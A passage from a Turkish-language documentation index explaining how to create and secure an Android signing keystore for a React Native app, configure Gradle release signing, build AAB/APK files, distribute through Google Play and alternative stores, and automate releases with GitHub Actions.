<code>keystore-info.txt</code> dosyas\u0131nda sakla (\u015fifreli cloud'da)</li> </ul>"},{"location":"android/keystore/#keystore-olusturma","title":"Keystore Olu\u015fturma \ud83d\udee0\ufe0f","text":""},{"location":"android/keystore/#gereksinimler","title":"Gereksinimler","text":"<pre><code># Java JDK kurulu olmal\u0131 (React Native s\u00fcr\u00fcm\u00fcn\u00fcze uygun)\njava -version\n\n# keytool komutu JDK ile gelir\nkeytool -version\n</code></pre> <p>[!IMPORTANT] JDK S\u00fcr\u00fcm Uyumlulu\u011fu:</p> <ul> <li>React Native 0.73+: JDK 17 (\u00f6nerilen)</li> <li>React Native 0.68-0.72: JDK 11 veya 17</li> <li>Eski versiyonlar: JDK 8 veya 11</li> </ul> <p>Yanl\u0131\u015f JDK s\u00fcr\u00fcm\u00fc build hatalar\u0131na neden olur!</p>"},{"location":"android/keystore/#keystore-olusturma-komutu","title":"Keystore Olu\u015fturma Komutu","text":"<pre><code># Proje root dizininde\ncd android/app\n\n# Keystore olu\u015ftur (\u00d6NER\u0130LEN)\nkeytool -genkeypair -v \\\n  -storetype PKCS12 \\\n  -keystore my-upload-key.keystore \\\n  -alias my-key-alias \\\n  -keyalg RSA \\\n  -keysize 2048 \\\n  -validity 10000 \\\n  -sigalg SHA256withRSA\n</code></pre> <p>Parametreler:</p> <ul> <li><code>-storetype PKCS12</code>: Modern keystore format\u0131 (\u00f6nerilen)</li> <li><code>-keystore my-upload-key.keystore</code>: Keystore dosya ad\u0131</li> <li><code>-alias my-key-alias</code>: Key alias (hat\u0131rlay\u0131n!)</li> <li><code>-keyalg RSA</code>: Algoritma</li> <li><code>-keysize 2048</code>: Key boyutu</li> <li><code>-validity 10000</code>: Ge\u00e7erlilik s\u00fcresi (g\u00fcn) - Minimum 25 y\u0131l gerekli!</li> <li><code>-sigalg SHA256withRSA</code>: \u0130mza algoritmas\u0131 (uyumluluk i\u00e7in)</li> </ul> <p>[!CAUTION] validity Parametresi Kritik: Google Play, sertifikan\u0131n en az 22 Ekim 2033 tarihine kadar ge\u00e7erli olmas\u0131n\u0131 \u015fart ko\u015far. 10000 g\u00fcnden (27 y\u0131l) az verilirse ileride g\u00fcncelleme sorunu ya\u015fanabilir!</p>"},{"location":"android/keystore/#istenecek-bilgiler","title":"\u0130stenecek Bilgiler","text":"<pre><code>Enter keystore password: ********\nRe-enter new password: ********\n\nWhat is your first and last name?\n  [Unknown]:  John Doe\n\nWhat is the name of your organizational unit?\n  [Unknown]:  Development\n\nWhat is the name of your organization?\n  [Unknown]:  MyCompany\n\nWhat is the name of your City or Locality?\n  [Unknown]:  Istanbul\n\nWhat is the name of your State or Province?\n  [Unknown]:  Istanbul\n\nWhat is the two-letter country code for this unit?\n  [Unknown]:  TR\n\nIs CN=John Doe, OU=Development, O=MyCompany, L=Istanbul, ST=Istanbul, C=TR correct?\n  [no]:  yes\n\nEnter key password for &lt;my-key-alias&gt;\n        (RETURN if same as keystore password): ********\n</code></pre> <p>[!IMPORTANT] \u015eifreleri Kaydedin:</p> <ul> <li>Keystore password</li> <li>Key alias</li> <li>Key password</li> </ul> <p>Bu bilgileri g\u00fcvenli bir yerde (password manager) saklay\u0131n!</p>"},{"location":"android/keystore/#keystoreu-guvenli-saklama","title":"Keystore'u G\u00fcvenli Saklama \ud83d\udd12","text":""},{"location":"android/keystore/#gitignorea-ekleyin","title":".gitignore'a Ekleyin","text":"<pre><code># android/app/.gitignore\n*.keystore\n*.jks\n</code></pre>"},{"location":"android/keystore/#yedekleme","title":"Yedekleme","text":"<pre><code># Keystore'u g\u00fcvenli bir yere yedekleyin\n# \u00d6rnek: \u015eifreli cloud storage, password manager\n\n# \u00d6NEML\u0130: Birden fazla yerde yedek tutun!\n# - Cloud storage (\u015fifreli)\n# - External hard drive\n# - Password manager\n</code></pre>"},{"location":"android/keystore/#keystore-bilgilerini-saklama","title":"Keystore Bilgilerini Saklama","text":"<p>gradle.properties (local):</p> <pre><code># android/gradle.properties (GIT'E EKLEMEY\u0130N!)\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\nMYAPP_UPLOAD_KEY_ALIAS=my-key-alias\nMYAPP_UPLOAD_STORE_PASSWORD=your_keystore_password\nMYAPP_UPLOAD_KEY_PASSWORD=your_key_password\n</code></pre> <p>[!WARNING] <code>gradle.properties</code> dosyas\u0131n\u0131 asla Git'e eklemeyin!</p>"},{"location":"android/keystore/#gradle-konfigurasyonu","title":"Gradle Konfig\u00fcrasyonu \u2699\ufe0f","text":""},{"location":"android/keystore/#androidappbuildgradle-hibrit-yaklasm","title":"android/app/build.gradle (Hibrit Yakla\u015f\u0131m)","text":"<pre><code>android {\n    ...\n    defaultConfig { ... }\n\n    // Signing configs (Env Vars &gt; gradle.properties)\n    signingConfigs {\n        debug {\n            storeFile file('debug.keystore')\n            storePassword 'android'\n            keyAlias 'androiddebugkey'\n            keyPassword 'android'\n        }\n        release {\n            // \u00d6ncelik: Environment Variables -&gt; gradle.properties\n            def keystoreFile = System.getenv(\"MYAPP_UPLOAD_STORE_FILE\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_FILE\")\n            def keystorePassword = System.getenv(\"MYAPP_UPLOAD_STORE_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_PASSWORD\")\n            def keyAlias = System.getenv(\"MYAPP_UPLOAD_KEY_ALIAS\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_ALIAS\")\n            def keyPassword = System.getenv(\"MYAPP_UPLOAD_KEY_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_PASSWORD\")\n\n            if (keystoreFile) {\n                storeFile file(keystoreFile)\n                storePassword keystorePassword\n                keyAlias keyAlias\n                keyPassword keyPassword\n            }\n        }\n    }\n\n    buildTypes {\n        debug {\n            signingConfig signingConfigs.debug\n        }\n        release {\n            // Proguard/R8 minification\n            minifyEnabled true\n            shrinkResources true\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n\n            // Signing\n            signingConfig signingConfigs.release\n        }\n    }\n}\n</code></pre> <p>[!TIP] Hibrit Yakla\u015f\u0131m Avantajlar\u0131:</p> <ul> <li>Local development: <code>gradle.properties</code> kullan\u0131r</li> <li>CI/CD: Environment variables kullan\u0131r (daha g\u00fcvenli)</li> <li><code>gradle.properties</code> dosyas\u0131 olu\u015fturmaya gerek kalmaz</li> </ul>"},{"location":"android/keystore/#proguardr8-rules-detayl","title":"ProGuard/R8 Rules (Detayl\u0131)","text":"<pre><code># android/app/proguard-rules.pro\n\n# ===== React Native Core =====\n-keep class com.facebook.react.** { *; }\n-keep class com.facebook.hermes.** { *; }\n-keep class com.facebook.jni.** { *; }\n\n# React Native Gesture Handler\n-keep class com.swmansion.gesturehandler.** { *; }\n\n# React Native Reanimated\n-keep class com.swmansion.reanimated.** { *; }\n\n# ===== Retrofit (API Calls) =====\n-keepattributes Signature\n-keepattributes *Annotation*\n-keep class retrofit2.** { *; }\n-keepclasseswithmembers class * {\n    @retrofit2.http.* &lt;methods&gt;;\n}\n\n# ===== OkHttp =====\n-dontwarn okhttp3.**\n-dontwarn okio.**\n-keep class okhttp3.** { *; }\n-keep interface okhttp3.** { *; }\n\n# ===== Gson/JSON =====\n-keep class com.google.gson.** { *; }\n-keepclassmembers,allowobfuscation class * {\n  @com.google.gson.annotations.SerializedName &lt;fields&gt;;\n}\n\n# ===== Firebase =====\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n\n# ===== Your App Models =====\n-keep class com.yourapp.models.** { *; }\n-keep class com.yourapp.api.** { *; }\n\n# ===== General =====\n-keepattributes SourceFile,LineNumberTable\n-keepattributes *Annotation*\n-renamesourcefileattribute SourceFile\n</code></pre>"},{"location":"android/keystore/#release-apkaab-olusturma","title":"Release APK/AAB Olu\u015fturma \ud83d\udce6","text":""},{"location":"android/keystore/#aab-android-app-bundle-onerilen","title":"AAB (Android App Bundle) - \u00d6nerilen","text":"<pre><code># Proje root dizininde\ncd android\n\n# Release AAB olu\u015ftur\n./gradlew bundleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"android/keystore/#apk-alternative","title":"APK (Alternative)","text":"<pre><code># Release APK olu\u015ftur\n./gradlew assembleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/keystore/#build-temizleme","title":"Build Temizleme","text":"<pre><code># Cache temizle\n./gradlew clean\n\n# Sonra tekrar build\n./gradlew bundleRelease\n</code></pre>"},{"location":"android/keystore/#aab-vs-apk-hangisini-kullanmal","title":"AAB vs APK: Hangisini Kullanmal\u0131? \ud83e\udd14","text":"<p>[!IMPORTANT] Google Play: AAB zorunlu (2021'den beri) Di\u011fer platformlar: APK kullan\u0131labilir</p> <p>Kar\u015f\u0131la\u015ft\u0131rma:</p> \u00d6zellik AAB (Android App Bundle) APK (Android Package) Google Play \u2705 Zorunlu \u274c Art\u0131k kabul edilmiyor Dosya Boyutu \u2705 %35 daha k\u00fc\u00e7\u00fck \u274c Daha b\u00fcy\u00fck Optimizasyon \u2705 Cihaza \u00f6zel \u274c Evrensel Direkt Y\u00fckleme \u274c M\u00fcmk\u00fcn de\u011fil \u2705 M\u00fcmk\u00fcn F-Droid \u274c Desteklemiyor \u2705 Destekliyor GitHub Releases \u274c Kullan\u0131c\u0131 y\u00fckleyemez \u2705 Direkt indirip y\u00fckler <p>Ne Zaman AAB?</p> <ul> <li>\u2705 Google Play Store'a y\u00fckleme</li> <li>\u2705 Dosya boyutu \u00f6nemli</li> <li>\u2705 Otomatik optimizasyon istiyorsan\u0131z</li> </ul> <p>Ne Zaman APK?</p> <ul> <li>\u2705 Direkt kullan\u0131c\u0131lara da\u011f\u0131t\u0131m</li> <li>\u2705 F-Droid, APKPure gibi alternatif ma\u011fazalar</li> <li>\u2705 GitHub Releases</li> <li>\u2705 Kendi web sitenizden indirme</li> <li>\u2705 Beta test (Google Play d\u0131\u015f\u0131nda)</li> </ul>"},{"location":"android/keystore/#alternatif-dagtm-kanallar-apk","title":"Alternatif Da\u011f\u0131t\u0131m Kanallar\u0131 (APK)","text":""},{"location":"android/keystore/#1-f-droid-ack-kaynak-uygulamalar","title":"1. F-Droid (A\u00e7\u0131k Kaynak Uygulamalar)","text":"<p>F-Droid Nedir?</p> <ul> <li>A\u00e7\u0131k kaynak Android uygulamalar\u0131 i\u00e7in alternatif ma\u011faza</li> <li>Tamamen \u00fccretsiz ve reklams\u0131z</li> <li>Gizlilik odakl\u0131 (tracking yok)</li> <li>Kaynak kodu a\u00e7\u0131k olmal\u0131</li> </ul> <p>Nas\u0131l Yay\u0131nlan\u0131r?</p> <pre><code># 1. Uygulaman\u0131z\u0131 a\u00e7\u0131k kaynak yap\u0131n (GitHub)\n# 2. F-Droid'e ba\u015fvuru yap\u0131n\n# https://f-droid.org/docs/Inclusion_Policy/\n\n# 3. Metadata dosyas\u0131 olu\u015fturun\n# fdroiddata/metadata/com.yourapp.txt\n\n# 4. F-Droid build server'\u0131 APK'y\u0131 olu\u015fturur\n# (Sizin keystore'unuz kullan\u0131lmaz, F-Droid'in kendi keystore'u)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 Tamamen \u00fccretsiz</li> <li>\u2705 Gizlilik odakl\u0131 kullan\u0131c\u0131lar</li> <li>\u2705 Otomatik g\u00fcncellemeler</li> <li>\u2705 Google Play'e alternatif</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Kaynak kodu a\u00e7\u0131k olmal\u0131</li> <li>\u274c F-Droid kendi keystore'u kullan\u0131r (Google Play ile ayn\u0131 APK de\u011fil)</li> <li>\u274c \u0130nceleme s\u00fcreci uzun (haftalar)</li> </ul>"},{"location":"android/keystore/#2-github-releases-en-kolay","title":"2. GitHub Releases (En Kolay)","text":"<p>Nas\u0131l Yap\u0131l\u0131r?</p> <pre><code># 1. Release APK olu\u015ftur\ncd android &amp;&amp; ./gradlew assembleRelease\n\n# 2. GitHub'da release olu\u015ftur\n# Repository \u2192 Releases \u2192 Create new release\n\n# 3. APK'y\u0131 upload et\n# Tag: v1.0.0\n# Title: Version 1.0.0\n# Description: Release notes\n# Assets: app-release.apk (upload)\n\n# 4. Publish release\n</code></pre> <p>Kullan\u0131c\u0131 \u0130ndirme:</p> <pre><code>https://github.com/yourname/yourapp/releases/latest\n\u2192 app-release.apk indir\n\u2192 Cihaza y\u00fckle (Unknown sources aktif olmal\u0131)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 \u00c7ok kolay</li> <li>\u2705 \u00dccretsiz</li> <li>\u2705 Versiyon kontrol\u00fc</li> <li>\u2705 Changelog ekleyebilirsin</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Otomatik g\u00fcncelleme yok</li> <li>\u274c Kullan\u0131c\u0131 \"Unknown sources\" aktif etmeli</li> <li>\u274c Google Play kadar g\u00fcvenilir de\u011fil (kullan\u0131c\u0131 g\u00f6z\u00fcnde)</li> </ul>"},{"location":"android/keystore/#3-apkpure-apkmirror","title":"3. APKPure / APKMirror","text":"<p>APKPure:</p> <ul> <li>\u00dc\u00e7\u00fcnc\u00fc parti APK ma\u011fazas\u0131</li> <li>Ba\u015fvuru: https://apkpure.com/developer</li> <li>\u00dccretsiz</li> </ul> <p>APKMirror:</p> <ul> <li>Sadece pop\u00fcler uygulamalar</li> <li>Ba\u015fvuru: https://www.apkmirror.com/apk-upload/</li> </ul>"},{"location":"android/keystore/#4-kendi-web-siteniz","title":"4. Kendi Web Siteniz","text":"<p>Basit Y\u00f6ntem:</p> <pre><code>&lt;!-- index.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;MyApp Download&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Download MyApp&lt;/h1&gt;\n    &lt;a href=\"app-release.apk\" download&gt;\n      &lt;button&gt;Download APK (v1.0.0)&lt;/button&gt;\n    &lt;/a&gt;\n\n    &lt;h2&gt;Installation:&lt;/h2&gt;\n    &lt;ol&gt;\n      &lt;li&gt;Download APK&lt;/li&gt;\n      &lt;li&gt;Settings \u2192 Security \u2192 Enable \"Unknown sources\"&lt;/li&gt;\n      &lt;li&gt;Open APK file&lt;/li&gt;\n      &lt;li&gt;Install&lt;/li&gt;\n    &lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Hosting:</p> <ul> <li>GitHub Pages (\u00fccretsiz)</li> <li>Netlify (\u00fccretsiz)</li> <li>Vercel (\u00fccretsiz)</li> <li>Kendi sunucunuz</li> </ul>"},{"location":"android/keystore/#5-samsung-galaxy-store","title":"5. Samsung Galaxy Store","text":"<p>Samsung cihazlar i\u00e7in alternatif:</p> <ul> <li>https://seller.samsungapps.com/</li> <li>APK kabul ediyor (AAB de\u011fil)</li> <li>Samsung cihazlarda pre-installed</li> </ul>"},{"location":"android/keystore/#dagtm-stratejisi-onerisi","title":"Da\u011f\u0131t\u0131m Stratejisi \u00d6nerisi","text":"<p>\u00c7oklu Platform Stratejisi:</p> <pre><code>1. Google Play Store (AAB)\n   \u251c\u2500 Ana da\u011f\u0131t\u0131m kanal\u0131\n   \u251c\u2500 Otomatik g\u00fcncellemeler\n   \u2514\u2500 En geni\u015f kitle\n\n2. F-Droid (APK - a\u00e7\u0131k kaynak)\n   \u251c\u2500 Gizlilik odakl\u0131 kullan\u0131c\u0131lar\n   \u251c\u2500 A\u00e7\u0131k kaynak toplulu\u011fu\n   \u2514\u2500 Google-free cihazlar\n\n3. GitHub Releases (APK)\n   \u251c\u2500 Beta testerlar\n   \u251c\u2500 Erken eri\u015fim\n   \u2514\u2500 Geli\u015ftirici toplulu\u011fu\n\n4. Kendi Web Siteniz (APK)\n   \u251c\u2500 Direkt kontrol\n   \u251c\u2500 Analytics\n   \u2514\u2500 \u00d6zel landing page\n</code></pre> <p>\u00d6rnek Senaryo:</p> <pre><code># 1. Google Play i\u00e7in AAB\n./gradlew bundleRelease\n# \u2192 Play Console'a y\u00fckle\n\n# 2. F-Droid / GitHub / Web i\u00e7in APK\n./gradlew assembleRelease\n# \u2192 GitHub Releases'e y\u00fckle\n# \u2192 Web sitene y\u00fckle\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Google Play: AAB (zorunlu)</li> <li>Di\u011fer her yer: APK</li> <li>Her ikisini de ayn\u0131 keystore ile imzala!</li> </ul>"},{"location":"android/keystore/#apkaab-test-etme","title":"APK/AAB Test Etme \ud83e\uddea","text":""},{"location":"android/keystore/#aabyi-apkya-cevirme-test-icin","title":"AAB'yi APK'ya \u00c7evirme (Test \u0130\u00e7in)","text":"<pre><code># bundletool indir\n# https://github.com/google/bundletool/releases\n\n# AAB'den APK olu\u015ftur\njava -jar bundletool.jar build-apks \\\n  --bundle=app-release.aab \\\n  --output=app-release.apks \\\n  --mode=universal\n\n# APK'y\u0131 extract et\nunzip app-release.apks -d output\n\n# Cihaza y\u00fckle\nadb install output/universal.apk\n</code></pre>"},{"location":"android/keystore/#imza-dogrulama","title":"\u0130mza Do\u011frulama","text":"<pre><code># APK imzas\u0131n\u0131 kontrol et\njarsigner -verify -verbose -certs app-release.apk\n\n# Detayl\u0131 bilgi\nkeytool -printcert -jarfile app-release.apk\n</code></pre>"},{"location":"android/keystore/#google-play-upload","title":"Google Play Upload \ud83d\ude80","text":""},{"location":"android/keystore/#play-consoleda-uygulama-olusturma","title":"Play Console'da Uygulama Olu\u015fturma","text":"<ol> <li>Google Play Console'a girin</li> <li>\"Create app\" t\u0131klay\u0131n</li> <li>Uygulama bilgilerini doldurun</li> <li>\"Create app\" t\u0131klay\u0131n</li> </ol>"},{"location":"android/keystore/#aab-upload","title":"AAB Upload","text":"<ol> <li>Production &gt; Releases &gt; Create new release</li> <li>AAB dosyas\u0131n\u0131 upload edin</li> <li>Release notes ekleyin</li> <li>Review release &gt; Start rollout to production</li> </ol>"},{"location":"android/keystore/#app-signing-by-google-play-onerilen","title":"App Signing by Google Play (\u00d6nerilen)","text":"<p>[!CAUTION] ZORUNLU HALE GEL\u0130YOR (2025): Google Play App Signing, 2025 sonuna kadar t\u00fcm yeni uygulamalar i\u00e7in zorunlu olacak! Mevcut uygulamalar i\u00e7in de \u015fiddetle \u00f6nerilir.</p> <p>[!TIP] Google Play App Signing kullanman\u0131z \u00f6nerilir:</p> <ul> <li>Google, keystore'unuzu y\u00f6netir</li> <li>Keystore kayb\u0131 riski ortadan kalkar</li> <li>Upload key ile signing key ayr\u0131l\u0131r</li> </ul> <p>Nas\u0131l Aktif Edilir:</p> <ol> <li>Play Console &gt; Setup &gt; App signing</li> <li>Use Google Play App Signing se\u00e7in</li> <li>Upload key'inizi y\u00fckleyin</li> </ol> <p>Upload Key vs Signing Key:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      Sen        \u2502    \u2502   Google Play    \u2502    \u2502   Kullan\u0131c\u0131     \u2502\n\u2502  Upload Key     \u2502 \u2500\u2500\u25ba\u2502  Signing Key     \u2502 \u2500\u2500\u25ba\u2502   \u0130ndirir       \u2502\n\u2502   (senin)       \u2502    \u2502  (Google'\u0131n)     \u2502    \u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Farklar:</p> \u00d6zellik Upload Key Signing Key Sahibi Sen olu\u015fturursun Google saklar Kullan\u0131m AAB'yi Google'a y\u00fcklerken Cihazlara da\u011f\u0131t\u0131rken Kaybedilirse \u2705 Yenilenebilir \u274c Google saklar, sorun yok G\u00fcvenlik Senin sorumlulu\u011fun Google'\u0131n sorumlulu\u011fu <p>[!TIP] Mevcut Uygulamay\u0131 App Signing'e Ta\u015f\u0131ma:</p> <p>E\u011fer daha \u00f6nce App Signing olmadan yay\u0131nlad\u0131ysan\u0131z:</p> <ol> <li>Play Console \u2192 Setup \u2192 App signing</li> <li>\"Use a different key\" se\u00e7</li> <li>PEPK tool ile mevcut keystore'u export et:</li> </ol> <pre><code>java -jar pepk.jar \\\n  --keystore=my-upload-key.keystore \\\n  --alias=my-key-alias \\\n  --output=encrypted_private_key.zip \\\n  --encryptionkey=GOOGLE_PROVIDED_KEY\n</code></pre> <ol> <li><code>encrypted_private_key.zip</code>'i upload et</li> </ol>"},{"location":"android/keystore/#apk-imza-semalar-v1v2v3","title":"APK \u0130mza \u015eemalar\u0131 (V1/V2/V3)","text":"<p>\u0130mza \u015eemalar\u0131:</p> \u015eema Android A\u00e7\u0131klama V1 (JAR) T\u00fcm\u00fc Eski y\u00f6ntem, yava\u015f do\u011frulama V2 7.0+ APK Signature Scheme v2 V3 9.0+ Key rotation deste\u011fi V4 11+ Incremental installs <p>Gradle Konfig\u00fcrasyonu:</p> <pre><code>// android/app/build.gradle\nandroid {\n    signingConfigs {\n        release {\n            // ... (keystore config)\n\n            // \u0130mza \u015femalar\u0131n\u0131 aktif et\n            v1SigningEnabled true\n            v2SigningEnabled true\n            enableV3Signing true  // Key rotation (API 28+)\n            enableV4Signing true  // Incremental installs (API 30+)\n        }\n    }\n}\n</code></pre> <p>[!NOTE] V3/V4 Signing:</p> <ul> <li><code>enableV3Signing</code>: Key rotation deste\u011fi (Android 9.0+)</li> <li><code>enableV4Signing</code>: Incremental updates (Android 11+)</li> <li>Her ikisi de performans art\u0131\u015f\u0131 sa\u011flar</li> </ul>"},{"location":"android/keystore/#version-yonetimi","title":"Version Y\u00f6netimi \ud83d\udcc8","text":""},{"location":"android/keystore/#androidappbuildgradle","title":"android/app/build.gradle","text":"<pre><code>android {\n    defaultConfig {\n        applicationId \"com.yourapp\"\n        minSdkVersion 21\n        targetSdkVersion 34  // Google Play minimum requirement (2024+)\n\n        // Version Code (her release'de art\u0131r\u0131n)\n        versionCode 1\n\n        // Version Name (kullan\u0131c\u0131ya g\u00f6sterilen)\n        versionName \"1.0.0\"\n    }\n}\n</code></pre> <p>[!WARNING] Target SDK Zorunlulu\u011fu: Google Play, her y\u0131l\u0131n sonuna do\u011fru yeni uygulamalar ve g\u00fcncellemeler i\u00e7in <code>targetSdkVersion</code>'\u0131 y\u00fckseltmeyi zorunlu k\u0131lar.</p> <ul> <li>2024: Minimum API 34 (Android 14)</li> <li>2025: Muhtemelen API 35</li> </ul> <p>Eski targetSdk ile uygulama g\u00fcncellenemez!</p>"},{"location":"android/keystore/#version-artrma-stratejisi","title":"Version Art\u0131rma Stratejisi","text":"<pre><code>versionCode: 1, 2, 3, 4, ... (her release'de +1)\nversionName: \"1.0.0\", \"1.0.1\", \"1.1.0\", \"2.0.0\" (semantic versioning)\n</code></pre> <p>\u00d6rnek:</p> <ul> <li><code>1.0.0</code> \u2192 <code>1.0.1</code> (bug fix)</li> <li><code>1.0.1</code> \u2192 <code>1.1.0</code> (yeni \u00f6zellik)</li> <li><code>1.1.0</code> \u2192 <code>2.0.0</code> (breaking change)</li> </ul>"},{"location":"android/keystore/#cicd-entegrasyonu","title":"CI/CD Entegrasyonu \ud83d\udd04","text":""},{"location":"android/keystore/#github-actions-ornegi","title":"GitHub Actions \u00d6rne\u011fi","text":"<pre><code># .github/workflows/android-release.yml\nname: Android Release\n\non:\n  push:\n    tags:\n      - \"v*\"\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up JDK\n        uses: actions/setup-java@v4\n        with:\n          java-version: \"17\"\n          distribution: \"temurin\"\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: \"20\"\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Decode Keystore\n        run: |\n          echo \"${{ secrets.KEYSTORE_BASE64 }}\" | base64 -d &gt; android/app/my-upload-key.keystore\n\n      - name: Create gradle.properties\n        run: |\n          echo \"MYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_ALIAS=${{ secrets.KEY_ALIAS }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_STORE_PASSWORD=${{ secrets.KEYSTORE_PASSWORD }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_PASSWORD=${{ secrets.KEY_PASSWORD }}\" &gt;&gt; android/gradle.properties\n\n      - name: Build AAB\n        run: |\n          cd android\n          ./gradlew bundleRelease\n\n      - name: Upload AAB\n        uses: actions/upload-artifact@v4\n        with:\n          name: app-release.aab\n          path: android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"android/keystore/#github-secrets-ekleme","title":"GitHub Secrets Ekleme","text":"<pre><code># Keystore'u base64'e \u00e7evir\nbase64 -i android/app/my-upload-key.keystore | pbcopy\n\n# GitHub &gt; Settings &gt; Secrets &gt; Actions &gt; New repository secret\n# KEYSTORE_BASE64: (paste)\n# KEY_ALIAS: my-key-alias\n# KEYSTORE_PASSWORD: your_password\n# KEY_PASSWORD: your_password\n</code></pre>"},{"location":"android/keystore/#troubleshooting","title":"Troubleshooting \ud83d\udd0d","text":""},{"location":"android/keystore/#yaygn-hatalar","title":"Yayg\u0131n Hatalar","text":"<p>Hata: \"Failed to read key\"</p> <pre><code># \u00c7\u00f6z\u00fcm: \u015eifreleri kontrol edin\nkeytool -list -v -keystore my-upload-key.keystore\n</code></pre> <p>Hata: \"Keystore was tampered with\"</p> <pre><code># \u00c7\u00f6z\u00fcm: Keystore bozulmu\u015f, yedekten geri y\u00fckleyin\n</code></pre> <p>Hata: \"Upload key not found\"</p> <pre><code># \u00c7\u00f6z\u00fcm: gradle.properties dosyas\u0131n\u0131 kontrol edin\ncat android/gradle.properties\n</code></pre>"},{"location":"android/keystore/#keystore-bilgilerini-goruntuleme","title":"Keystore Bilgilerini G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Keystore i\u00e7eri\u011fini listele\nkeytool -list -v -keystore my-upload-key.keystore\n\n# Alias'lar\u0131 g\u00f6ster\nkeytool -list -keystore my-upload-key.keystore\n\n# Sertifika detaylar\u0131\nkeytool -list -v -keystore my-upload-key.keystore -alias my-key-alias\n</code></pre>"},{"location":"android/keystore/#checklist-production-release","title":"Checklist: Production Release \ud83d\udccb","text":"<ul> <li>[ ] Keystore olu\u015fturuldu ve g\u00fcvenli yerde sakland\u0131</li> <li>[ ] Keystore \u015fifreleri kaydedildi (password manager)</li> <li>[ ] <code>.gitignore</code>'a <code>*.keystore</code> eklendi</li> <li>[ ] <code>gradle.properties</code> konfig\u00fcre edildi</li> <li>[ ] <code>build.gradle</code> signing config eklendi</li> <li>[ ] <code>versionCode</code> ve <code>versionName</code> g\u00fcncellendi</li> <li>[ ] ProGuard/R8 aktif (<code>minifyEnabled true</code>)</li> <li>[ ] Release AAB/APK build edildi</li> <li>[ ] \u0130mza do\u011fruland\u0131 (<code>jarsigner -verify</code>)</li> <li>[ ] Test cihaz\u0131nda \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131</li> <li>[ ] Google Play Console'da uygulama olu\u015fturuldu</li> <li>[ ] App Signing by Google Play aktif</li> <li>[ ] AAB upload edildi</li> <li>[ ] Release notes eklendi</li> </ul>"},{"location":"android/keystore/#guvenlik-best-practices","title":"G\u00fcvenlik Best Practices \ud83d\udd10","text":"<ol> <li>Keystore G\u00fcvenli\u011fi:</li> <li>Asla Git'e commit etmeyin</li> <li>Birden fazla yerde yedekleyin</li> <li> <p>\u015eifreli cloud storage kullan\u0131n</p> </li> <li> <p>\u015eifre Y\u00f6netimi:</p> </li> <li>G\u00fc\u00e7l\u00fc \u015fifreler kullan\u0131n (16+ karakter)</li> <li>Password manager kullan\u0131n</li> <li> <p>\u015eifreleri kimseyle payla\u015fmay\u0131n</p> </li> <li> <p>CI/CD:</p> </li> <li>Secrets'\u0131 environment variables olarak saklay\u0131n</li> <li>Base64 encode edin</li> <li> <p>Logs'da \u015fifreleri expose etmeyin</p> </li> <li> <p>Google Play App Signing:</p> </li> <li>Mutlaka aktif edin</li> <li>Upload key ile signing key ayr\u0131 olsun</li> <li>Keystore kayb\u0131 riskini minimize edin</li> </ol>"},{"location":"android/keystore/#eksik-kritik-konular","title":"Eksik Kritik Konular \u26a0\ufe0f","text":""},{"location":"android/keystore/#sha-256-fingerprint-firebasegoogle-services-icin","title":"SHA-256 Fingerprint (Firebase/Google Services \u0130\u00e7in)","text":"<p>Firebase, Google Sign-In, Google Maps kullan\u0131yorsan\u0131z mutlaka gerekli:</p> <pre><code># Release keystore'un SHA-256 fingerprint'ini al\u0131n\nkeytool -list -v -keystore android/app/my-upload-key.keystore -alias my-key-alias\n\n# \u00c7\u0131kt\u0131da \u015funu aray\u0131n:\n# SHA256: 